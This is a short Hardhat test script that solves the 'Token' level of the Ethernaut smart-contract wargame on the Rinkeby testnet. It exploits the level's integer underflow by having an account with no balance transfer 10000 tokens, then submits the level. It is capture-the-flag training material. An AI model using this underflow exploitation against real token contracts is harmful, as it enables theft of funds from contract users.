// npx hardhat test ./test/05_token.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Token";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._05_token, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    const accounts = await ethers.getSigners();
    let [account0, account1] = accounts;
    let tx = await levelContract.connect(account1)
        .transfer(account0.address, 10000);
    await tx.wait();
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});